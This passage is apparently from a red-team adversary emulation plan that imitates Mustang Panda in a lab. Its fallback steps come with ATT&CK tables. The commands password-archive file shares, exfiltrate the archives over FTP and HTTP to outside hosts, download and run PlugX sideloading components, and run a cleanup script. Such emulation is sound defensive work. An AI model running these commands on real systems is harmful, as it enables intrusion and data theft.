- ☣️ Save the file as `C:\Windows\Temp\files.txt` and exit notepad.

- ☣️ Return to the main scenario.

## Step 6 - No Tunnel Available to Run WinRAR

### Voice Track

If no VS Code tunnel is available to execute WinRAR, perform the following
alternative step(s) to execute `rar.exe` via PowerShell.

### Procedures

- ☣️ Within your RDP session to the workstation `harrenhal (10.55.4.103)`, open an
administrator PowerShell prompt if one does not already exist, and run the
following command to create the archives.

  ```powershell
  65..90 | %{ $drive = [char]$_; & "C:\Program Files\WinRAR\rar.exe" a -r -v250m -hpj5Tft5lLFFcQK -x*\appdata\ -x*\ProgramData\* -x*\Recovery\* -x'*\System Volume Information\*' -x'*\$RECYCLE.BIN\*' -x'*\Program Files\*' -x'*\Program Files (x86)\*' -x*\Windows\* -x*\Python312\* -x*\crash_dumps\* -x*\PerfLogs\* -n@"C:\Windows\Temp\files.txt" "C:\Windows\Temp\${drive}.rar" "\\10.55.3.105\${drive}`$\*"}
  ```

  - ***Expected Output***

    ```text
    RAR 7.11 x64   Copyright (c) 1993-2025 Alexander Roshal   20 Mar 2025
    Trial version             Type 'rar -?' for help

    Evaluation copy. Please register.

    Creating archive A.rar

    WARNING: No files

    ...

    Creating archive C.rar

    Adding    C:\...  OK
    Adding    C:\...  OK
    ...
    ```

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | Windows | - | Not Calibrated - Not Benign | Mustang Panda executes PowerShell commands | harrenhal (10.55.4.103) | htargaryen | - | [26]
| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | - | Not Calibrated - Not Benign | Mustang Panda executes `rar.exe` against shares of the file server `conclave (10.55.3.105)` | conclave (10.55.3.105), harrenhal (10.55.4.103) | htargaryen | - | [25], [26]
| Collection | T1560.001 | Archive Collected Data: Archive via Utility | Windows | - | Not Calibrated - Not Benign | Mustang Panda uses `rar.exe` to compress the A-Z shares of the file server `conclave (10.55.3.105)` | conclave (10.55.3.105), harrenhal (10.55.4.103) | htargaryen | - | [25], [26]

## Step 6 - No TONESHELL Implant Available To Download Curl

### Voice Track

If there is no TONESHELL implant available to download curl, perform the following
alternative step(s) to download it via command prompt.

### Procedures

- ☣️ Within your RDP session to the workstation `harrenhal (10.55.4.103)`, open an
administrator command prompt if one does not already exist, and run the
following command to download curl.

  ```cmd
  curl http://pentos-analysis.org/files/curl.exe -o "C:\Program Files\Microsoft VS Code\prpbg.dat.bak.1"
  ```

  - ***Expected Output***

    ```text
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100  587k  100  587k    0     0  16.9M      0 --:--:-- --:--:-- --:--:-- 18.5M
    ```

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | - | Not Calibrated - Not Benign | Mustang Panda downloads `curl.exe` as `C:\Program Files\Microsoft VS Code\prpbg.dat.bak.1` | harrenhal (10.55.4.103) | htargaryen | - | [21]

## Step 6 - Failed to Download Curl

### Voice Track

If curl failed to download via TONESHELL or alternative step, perform the
following alternative step(s) to use the existing `curl.exe` binary to perform
exfil.

### Procedures

- ☣️ Within your RDP session to the workstation `harrenhal (10.55.4.103)`, open an
administrator command prompt if one does not already exist, and run the
following command to exfil the RAR files via curl.

  ```cmd
  $files = gci -path "c:\windows\temp" -Filter *.rar | select-object -expandproperty FullName
  foreach ($file in $files){
      curl.exe -T $file ftp://ftp_user:Gracious-Coat@49.67.12.21/do/ --ftp-create-dirs
  }
  ```

  - ***Expected Output***

    ```text
     % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 5191k    0     0  100 5191k      0  7391k --:--:-- --:--:-- --:--:-- 7394k
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 84.3M    0     0  100 84.3M      0  47.8M  0:00:01  0:00:01 --:--:-- 47.7M
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 84.3M    0     0  100 84.3M      0  58.3M  0:00:01  0:00:01 --:--:-- 58.3M
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 84.3M    0     0  100 84.3M      0  61.5M  0:00:01  0:00:01 --:--:-- 61.5M
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 84.3M    0     0  100 84.3M      0  55.7M  0:00:01  0:00:01 --:--:-- 55.7M
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 84.3M    0     0  100 84.3M      0  58.6M  0:00:01  0:00:01 --:--:-- 58.6M
    ```

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Exfiltration | T1048 | Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol | Windows | - | Calibrated - Not Benign | Mustang Panda exfiltrates the RAR files over FTP to `49.67.12.21` | harrenhal (10.55.4.103) | htargaryen | - | [19], [21]

## Step 7 - User Fails to Receive Phishing Email

### Voice Track

If the user fails to receive the phishing email in Outlook, perform the
following alternative step to download the MSI installer.

### Procedures

- ☣️ Within your RDP session to the workstation `stepstones (10.55.4.104)`, open
Edge and browse to the following URL to initiate the download of the MSI
installer: `http://mailstreamnet.com/files/invite_doc.html`

- ☣️ After opening the webpage in the browser, open the Downloads folder to
confirm download of the MSI installer `2025p2.msi`.

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Execution | T1204.001 | User Execution: Malicious Link | Windows | - | Not Calibrated - Not Benign | `ccole` manually executes the spearphishing email link | stepstones (10.55.4.104) | ccole | - | [9], [14], [17]

## Step 7 - Download of MSI Fails

### Voice Track

If the phishing link fails to download the MSI installer, perform the following
alternative steps.

### Procedures

- ☣️ Within your RDP session to the workstation `stepstones (10.55.4.104)`, open
Command Prompt and run the following commands to manually download the MSI
installer

  ```cmd
  curl http://pentos-analysis.org/files/2025p2.msi -o %userprofile%\Downloads\2025p2.msi
  ```

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | - | Not Calibrated - Not Benign | User manually downloads a malicious MSI file `2025p2.msi` | stepstones (10.55.4.104) | ccole | - | [3], [14]

## Step 7 - MSI Installation Fails

### Voice Track

If the MSI installer fails to download/execute the Plug X components, perform
the following alternative steps.

### Procedures

- ☣️ Within your RDP session to the workstation `stepstones (10.55.4.104)`, open
Command Prompt and run the following commands.

  ```psh
  mkdir %LOCALAPPDATA%\EvRDRunMP
  curl http://pentos-analysis.org/files/gup.exe -o %LOCALAPPDATA%\EvRDRunMP\gup.exe
  curl http://pentos-analysis.org/files/gup.xml -o %LOCALAPPDATA%\EvRDRunMP\gup.xml
  curl http://pentos-analysis.org/files/libcurl.dll -o %LOCALAPPDATA%\EvRDRunMP\libcurl.dll
  curl http://pentos-analysis.org/files/WinGUpdate.dat -o %LOCALAPPDATA%\EvRDRunMP\WinGUpdate.dat
  .\%LOCALAPPDATA%\EvRDRunMP\gup.exe
  ```

- ☣️ Confirm execution of Plug X shellcode and a new implant session in the C2
handler on the Kali machine.

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Defense Evasion | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | Windows | - | Not Calibrated - Not Benign | Plug X shellcode `WinGUpdate.dat` is encrypted using RC4 | stepstones (10.55.4.104) | ccole | - | [3], [8], [14]
| Defense Evasion | T1574.002 | Hijack Execution Flow: DLL Side Loading | Windows | - | Not Calibrated - Not Benign | Legitimate binary `GUP.exe` sideloads Plug X loader `libcurl.dll` | stepstones (10.55.4.104) | ccole | - | [3], [7], [12], [14], [15]
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Windows | - | Not Calibrated - Not Benign | Plug X loader `libcurl.dll` reads and decrypts Plug X shellcode `WinGUpdate.dat` | stepstones (10.55.4.104) | ccole | - | [3], [7], [8], [12], [14], [15]
| Defense Evasion | T1620 | Reflective Code Loading | Windows | - | Not Calibrated - Not Benign | Plug X loader `libcurl.dll` loads the Plug X shellcode into memory | stepstones (10.55.4.104) | ccole | - | [3], [7], [8], [12], [14]
| Defense Evasion | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | - | Not Calibrated - Not Benign | Plug X uses `GetProcAddress` API to dynamically resolve API calls at runtime | stepstones (10.55.4.104) | ccole | - | [8], [13]
| Persistence | T1574.001 | Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder | Windows | - | Not Calibrated - Not Benign | Plug X creates a registry run key named `WinGupSvc` | stepstones (10.55.4.104) | ccole | - | [3], [7], [8], [12], [14], [15]
| Command and Control | T1071.001 | Application Layer Protocol: Web Protocols | Windows | - | Not Calibrated - Not Benign | Plug X connects to `ValarMorghulis.org` over HTTPS | stepstones (10.55.4.104) | ccole | - | [7]
| Command and Control | T1573.002 | Encrypted Channel: Asymmetric Cryptography | Windows | - | Not Calibrated - Not Benign | Plug X leverages HTTPS for encrypted communication with the C2 | stepstones (10.55.4.104) | ccole | - | [2], [7]

## Step 8 - Plug X Fails to Archive Files

### Voice Track

If Plug X fails to archive specific file types, perform the following
alternative steps.

### Procedures

- ☣️ Within your RDP session to the workstation `stepstones (10.55.4.104)`, open
PowerShell and run the following command to archive specific file types

  ```psh
  & 'C:\Program Files\WinRAR\Rar.exe' a -r -m5 -ibck -ed -v325m -hpI1HcgjY7bWRA8 -inul -ta202504230000000 C:\Users\Public\Documents\b44d0xUT5BLOi.rar "C:\*.pdf" "C:\*.doc*" "C:\*.ppt*" "C:\*.xls*" "C:\users\*.png" "C:\users\*.jpg" "C:\users\*.jpeg"
  ```

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Windows | - | Not Calibrated - Not Benign | User manually executes commands | stepstones (10.55.4.104) | ccole | - | [3]
| Collection | T1005 | Data from Local System | Windows | - | Not Calibrated - Not Benign | `cmd.exe` executes `rar.exe` to search for specific file extensions | stepstones (10.55.4.104) | ccole | - | [1], [25]
| Collection | T1560.001 | Archive Collected Data: Archive via Utility | Windows | - | Not Calibrated - Not Benign | `cmd.exe` executes `rar.exe` to create RAR archives | stepstones (10.55.4.104) | ccole | - | [23], [25]

## Step 8 - Plug X Fails to Exfiltrate Archived Files

### Voice Track

If exfiltrating the RAR files to the FTP server fails, perform the following
alternative steps.

### Procedures

- ☣️ Within your RDP session to the workstation `stepstones (10.55.4.104)`, open
Command Prompt and run the following command to exfiltrate the files to the
Simple File Server

  ```cmd
  curl -X POST http://pentos-analysis.org/uploads -H "filename:b44d0xUT5BLOi.rar" --data-binary "C:\Users\Public\Documents\*.rar"
  ```

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Exfiltration | T1048.003 | Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol | Windows | - | Not Calibrated - Not Benign | `cmd.exe` executes `curl.exe` to exfiltrate RAR archives to attacker FTP server `49.67.12.21` | stepstones (10.55.4.104) | ccole | - | [23], [25]

## Step 9 - Downloading Cleanup Batch Script Fails

### Voice Track

If the cleanup batch script fails to download via Plug X, perform the following
alternative steps.

### Procedures

- ☣️ Within your RDP session to the workstation `stepstones (10.55.4.104)`, open
Command Prompt and run the following command to download and execute the cleanup
batch script

  ```cmd
  curl http://pentos-analysis.org/files/del_WinGupSvc.bat -o %TEMP%\del_WinGupSvc.bat
  %TEMP%\del_WinGupSvc.bat

  ```

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | - | Not Calibrated - Not Benign | `cmd.exe` executes `curl.exe` to download cleanup batch script to `%TEMP%\del_WinGupSvc.bat` | stepstones (10.55.4.104) | ccole | - | [3], [17]
| Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Windows | - | Not Calibrated - Not Benign | `cmd.exe` executes the cleanup batch script `%TEMP%\del_WinGupSvc.bat` | stepstones (10.55.4.104) | ccole | - | [3], [17]
| Defense Evasion | T1070.009 | Indicator Removal: Clear Persistence | Windows | - | Not Calibrated - Not Benign | The cleanup batch script `%TEMP%\del_WinGupSvc.bat` deletes the created registry key | stepstones (10.55.4.104) | ccole | - | [3], [17]
| Defense Evasion | T1070.004 | Indicator Removal: File Deletion | Windows | - | Not Calibrated - Not Benign | The cleanup batch script `%TEMP%\del_WinGupSvc.bat` deletes downloaded malicious files and itself | stepstones (10.55.4.104) | ccole | - | [3], [17]
